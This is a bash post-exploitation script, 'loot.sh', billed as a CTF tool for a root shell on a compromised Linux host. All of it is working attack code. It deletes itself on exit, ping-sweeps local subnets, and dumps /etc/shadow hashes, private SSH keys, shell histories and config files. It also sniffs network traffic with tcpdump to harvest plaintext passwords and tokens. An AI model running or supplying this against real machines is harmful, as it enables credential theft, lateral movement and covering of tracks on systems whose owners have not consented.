#!/bin/bash
#
# loot.sh
# Linux Local Root Loot Script for CTFs
# Designed to be run as root/SYSTEM on a compromised Linux machine
# to quickly extract information and secrets for lateral movement and flag finding.
#
# Usage:
# 1. Transfer this script to the target machine (e.g., via scp, http server).
# 2. Make it executable: chmod +x loot.sh
# 3. Run as root: ./loot.sh
#
# Output will be displayed directly on the screen.
#

# --- Self-Deletion Trap ---
# This trap will attempt to remove the script file itself upon exit (normal or interrupted).
trap 'rm "$0" 2>/dev/null; exit' EXIT

# --- EZPZ-style Colors & Banners (adapted for local script) ---
# Functions to output messages similar to ezpz.
ezpz_banner() {
    echo -e "\033[1;35m[!] Dumping $1...\033[0m"
}

# Function to output command execution (like [>] in ezpz). Filters (grep, awk, 2>/dev/null)
# are part of the *execution* details, not the main command display.
ezpz_cmd_exec() {
    echo -e "\033[0;34m[>] $1 \033[0m"
}

# Function for info messages (like [*] in ezpz)
ezpz_info_msg() {
    echo -e "\033[0;36m[*] $1 \033[0m"
}

# --- Root Privilege Check ---
if [[ $EUID -ne 0 ]]; then
   echo -e "\033[1;31m[!] This script must be run as root.\033[0m" # Direct to stdout
   echo -e "\033[1;31m[!] Exiting.\033[0m" # Direct to stdout
   exit 1
fi

# --- Section 1: Dumping Machine Information ---
ezpz_banner "machine information"

ezpz_info_msg "Hostname"
ezpz_cmd_exec "hostname"
hostname

echo "" # Separator

ezpz_info_msg "Operating System"
ezpz_cmd_exec "cat /etc/os-release || uname -a"
# Filter /etc/os-release for NAME and VERSION, or fall back to uname -a.
# Pipes are part of internal logic, not shown in [>]
cat /etc/os-release 2>/dev/null | awk -F'=' '/^NAME|^VERSION=/ { gsub(/"/, "", $2); print $1": "$2 }' || uname -a

echo "" # Separator

ezpz_info_msg "Users with home directories"
ezpz_cmd_exec "cat /etc/passwd | grep -E '/home|/root' | cut -d: -f1" # Pipes are part of internal logic
cat /etc/passwd | grep -E '/home|/root' | cut -d: -f1

# --- Section 2: Getting Network Information ---
ezpz_banner "network information"

ezpz_info_msg "Network interfaces"
ezpz_cmd_exec "ip a || ifconfig -a"
# Revert to simpler output for `ip a` and `ifconfig -a`
# This will print the raw output of the command, which is what your example showed,
# and avoids complex awk/sed that might break across different Linux versions.
ip a 2>/dev/null | grep -E "UP|link|inet"
if [[ $? -ne 0 ]]; then # If ip a failed, try ifconfig
    ifconfig -a 2>/dev/null
fi

echo "" # Separator

ezpz_info_msg "ARP Cache"
ezpz_cmd_exec "arp -a"
arp -a | sort -V

echo "" # Separator

ezpz_info_msg "Ping sweep" 
# Extract /24 subnets. Robustly get base IP prefix from 'ip a'.
# Example: "172.16.1.23/24" -> "172.16.1"
# Removed 'local' keyword to fix script-level variable scope for bash.
ips_with_cidr=($(ip a | grep 'inet ' | grep -v '127.0.0.1' | grep -v 'docker' | grep -v 'virbr' | awk '{print $2}'))

if [[ ${#ips_with_cidr[@]} -gt 0 ]]; then
    for ip_cidr in "${ips_with_cidr[@]}"; do
        # Extract base IP prefix by taking up to the third octet
        base_ip_prefix=$(echo "$ip_cidr" | cut -d'/' -f1 | cut -d'.' -f1-3)
        
        if [[ -n "$base_ip_prefix" ]]; then # Ensure prefix was successfully extracted
            # ezpz_info_msg "Performing ping sweep on ${base_ip_prefix}.0/24..."
            ezpz_cmd_exec "for i in {1..254}; do (ping -c 1 ${base_ip_prefix}.\$\i | grep \"bytes from\" &) ;done"
            for i in $(seq 1 254); do
                # Redirect stdout/stderr of background pings to /dev/null
                (ping -c 1 "${base_ip_prefix}.$i" | grep "bytes from" 2>/dev/null &)
            done
            wait # Wait for all background pings for this subnet to finish
            echo "" # Newline after each subnet sweep
        fi
    done
else
    ezpz_info_msg "No eligible /24 subnets found for ping sweep (excluding loopback/docker/virbr)."
fi


# --- Section 3: Extracting Secrets ---
ezpz_banner "secrets"

ezpz_info_msg "Searching for flag.txt"
ezpz_cmd_exec "find / -name flag.txt -print -exec cat {} \; 2>/dev/null"
# The -print option followed by -exec cat {} \; prints the path then the content.
find / -name flag.txt -print -exec cat {} \; 2>/dev/null

echo "" # Separator

ezpz_info_msg "Searching for interesting files in home folders"
ezpz_cmd_exec "find /home /root -type f -name \"*.conf\" -o -name \"*.bak\" -o ... -print -exec cat {} \; 2>/dev/null" # Simplified command display
# Print the file path first, then its content
find /home /root -type f \
    \( -name "*.conf" -o -name "*.bak" -o -name "*.old" -o -name "*.log" -o -name "*.yml" \
    -o -name "*.yaml" -o -name "*.json" -o -name "*.xml" \) \
    -print -exec cat {} \; 2>/dev/null

echo "" # Separator

ezpz_info_msg "Extracting shell history"
ezpz_cmd_exec "find /home /root -name \".bash_history\" -o -name \".zsh_history\" -o -name \".sh_history\" -print -exec cat {} \; 2>/dev/null"
find /home /root -name ".bash_history" -o -name ".zsh_history" -o -name ".sh_history" -print -exec cat {} \; 2>/dev/null

echo "" # Separator

ezpz_info_msg "Extracting /etc/shadow (user:hash format)"
# The new, robust filter: second field length > 1 (excluding '!', '*')
ezpz_cmd_exec "cat /etc/shadow | awk -F: 'length(\$2) > 1 && \$2 !~ /^\\!|^\\*|^x$/ {print \$1\":\"\$2}'"
cat /etc/shadow | awk -F: 'length($2) > 1 && $2 !~ /^\!|^x$|^x$/ {print $1":"$2}' 

echo "" # Separator

ezpz_info_msg "Extracting id_rsa files (private keys only)"
ezpz_cmd_exec "find /home /root -type f -name \"id_rsa*\" ! -name \"*.pub\" -print -exec cat {} \; 2>/dev/null" # Simplified and accurate display
# Explicitly look for "id_rsa" and variations like "id_rsa_ed25519", etc., but exclude .pub
find /home /root -type f -name "id_rsa*" -and ! -name "*.pub" -print -exec cat {} \; 2>/dev/null

# --- Section 4: Live Credential Sniffing (TCPDUMP) ---
ezpz_banner "network traffic"

capture_file="/tmp/tcpdump_capture_$(date +%Y%m%d%H%M%S).txt"
duration_seconds=120 # 2 minutes
tcpdump_filter="tcp and (port 80 or port 21 or port 23 or port 110 or port 143 or port 3306 or port 5432)"
grep_pattern="user|pass|login|pwd|cred|token|api_key|secret"

ezpz_info_msg "Starting tcpdump capture for $duration_seconds seconds. Results will be saved and then searched for keywords."
ezpz_cmd_exec "tcpdump -i any -A -s 0 '$tcpdump_filter' > $capture_file"

# Run tcpdump in background for the specified duration
# Send output to /dev/null and save to file.
timeout "${duration_seconds}s" tcpdump -i any -A -s 0 "$tcpdump_filter" > "$capture_file" 2>/dev/null &
tcpdump_pid=$! # Get PID of tcpdump background process

# Show a simple progress indicator
progress_bar_length=50
sleep_interval=5 # Update every 5 seconds
for (( i=0; i < duration_seconds; i+=sleep_interval )); do
    current_progress=$(( i * progress_bar_length / duration_seconds ))
    # Only print if on a terminal (not redirected to file)
    if [[ -t 1 ]]; then # Check if stdout is a terminal
        printf "\r\033[0[%-${progress_bar_length}s] %d%%\033[0m" "$(printf '=%.0s' $(seq 1 $current_progress))" $(( i * 100 / duration_seconds ))
    fi
    sleep "$sleep_interval"
done
# Final 100% update for progress bar
if [[ -t 1 ]]; then
    printf "\r\033[0m[%-${progress_bar_length}s] %d%%\033[0m\n" "$(printf '=%.0s' $(seq 1 $progress_bar_length))" 100
fi

wait "$tcpdump_pid" 2>/dev/null # Ensure tcpdump has truly finished/been killed by timeout

ezpz_info_msg "Capture finished. Searching for keywords in $capture_file..."
ezpz_cmd_exec "grep -iE \"$grep_pattern\" $capture_file"

# Execute grep and store its result. $? will be 0 if matches found, 1 if not.
grep_result=$(grep -iE "$grep_pattern" "$capture_file")
grep_exit_code=$?

if [[ -f "$capture_file" ]]; then
    if [[ $grep_exit_code -eq 0 ]]; then
        echo "$grep_result" # Print the results found by grep
        echo -e "\033[0;33m[*] Run \"tcpdump -i any -w tcpdump.pcap\" for further analysis on wireshark\033[0m" 
    else
        echo -e "\033[0;33m[*] No keywords found in the captured traffic.\033[0m"
    fi
    # Clean up the temporary capture file
    rm -f "$capture_file"
else
    echo -e "\033[0;33m[*] No capture file created or found. Tcpdump might have failed.\033[0m"
fi

echo "" # Separator

# --- Script Completion ---
echo -e "\033[1;31m[*] Done. \033[0m"
